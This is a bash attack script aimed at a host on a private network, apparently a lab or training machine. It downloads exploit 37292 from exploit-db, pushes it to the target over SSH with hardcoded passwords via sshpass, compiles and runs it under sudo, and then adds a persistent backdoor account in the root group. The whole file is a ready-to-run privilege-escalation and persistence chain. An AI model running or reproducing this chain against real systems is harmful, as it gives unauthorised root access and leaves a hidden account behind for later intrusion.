#!/bin/bash

M="192.168.1.89"

COMPTE_01="han_solo"
PASS_01="nerf_herder"

COMPTE_02="compte_persistent"
PASS_02="JesuisUnPassw0rd12"
PASS_HASHED=$(openssl passwd --password JesuisUnPassw0rd12)

wget -O "37292.c" "https://www.exploit-db.com/download/37292"
sshpass -p "$PASS_01" scp "37292.c" $COMPTE_01@$M:

sshpass -p "$PASS_01" ssh $COMPTE_01@$M "gcc 37292.c"

sshpass -p "$PASS_01" ssh $COMPTE_01@$M "echo $PASS_01 | sudo -S ./a.out && echo $PASS_01 | sudo -S useradd -g root -s /bin/bash -m -p $PASS_HASHED compte_persistent"